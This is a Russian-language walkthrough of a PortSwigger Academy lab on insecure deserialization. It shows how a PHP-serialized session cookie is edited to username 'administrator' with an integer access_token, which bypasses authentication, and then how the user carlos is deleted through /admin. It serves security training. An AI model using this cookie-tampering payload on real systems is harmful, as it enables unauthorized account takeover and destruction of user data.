Залогинимся под `wiener:peter`

в `Proxy` -> `HTTP history`

увидим, что после логина нам выдало следующую куку
```
Set-Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJsNHIzNnlxbzdoeHR3bGl3ZW9vOHhoaWx0dWlwcmF6bCI7fQ%3d%3d
```

что в декодированном виде будет выглядеть как
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"l4r36yqo7hxtwliweoo8xhiltuiprazl";}
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/2.%20Modifying%20serialized%20data%20types/pics%20for%20walkthrough/1.png)

Отправим 
```
GET /my-account?id=wiener
...
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJsNHIzNnlxbzdoeHR3bGl3ZW9vOHhoaWx0dWlwcmF6bCI7fQ%3d%3d
```
В `Repeater`

Далее изменим декодированную часть, чтобы залогинится под аккаунтом administrator как и положено по заданию

изменим 
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
и нажмем `Apply changes` и отправим запрос
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/2.%20Modifying%20serialized%20data%20types/pics%20for%20walkthrough/2.png)

После редиректов увидим, что у нас в рендере появилась панель `Admin panel`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/2.%20Modifying%20serialized%20data%20types/pics%20for%20walkthrough/3.png)

Перейдем в `/admin `
```
GET /admin
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/2.%20Modifying%20serialized%20data%20types/pics%20for%20walkthrough/4.png)

и удалим УЗ `carlos`, как это и требует задание
```
GET /admin/delete?username=carlos 
```
И после всех редиректов получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/2.%20Modifying%20serialized%20data%20types/pics%20for%20walkthrough/5.png)
